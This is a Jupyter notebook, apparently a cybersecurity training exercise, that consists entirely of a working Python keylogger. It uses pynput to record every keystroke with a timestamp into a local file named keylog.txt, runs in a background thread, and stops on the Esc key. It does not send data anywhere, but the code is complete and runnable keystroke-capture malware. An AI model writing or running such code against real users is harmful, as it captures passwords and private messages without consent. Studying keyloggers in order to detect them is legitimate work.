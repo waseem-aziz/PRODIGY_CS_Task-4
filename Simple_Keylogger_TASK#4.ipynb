{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "8fba37ac",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\users\\waseem aziz\\anaconda3\\lib\\site-packages (1.7.7)\n",
      "Requirement already satisfied: six in c:\\users\\waseem aziz\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput\n",
    "\n",
    "from pynput import keyboard\n",
    "import logging\n",
    "\n",
    "# Set up logging to a file\n",
    "log_file = \"keylog.txt\"\n",
    "logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        logging.info(str(key.char))\n",
    "    except AttributeError:\n",
    "        logging.info(str(key))\n",
    "\n",
    "def on_release(key):\n",
    "    # Stop the keylogger when the escape key is pressed\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False\n",
    "\n",
    "# Set up the listener\n",
    "def start_keylogger():\n",
    "    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "        listener.join()\n",
    "\n",
    "# Start the keylogger in a separate thread to avoid blocking the notebook\n",
    "import threading\n",
    "keylogger_thread = threading.Thread(target=start_keylogger)\n",
    "keylogger_thread.start()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
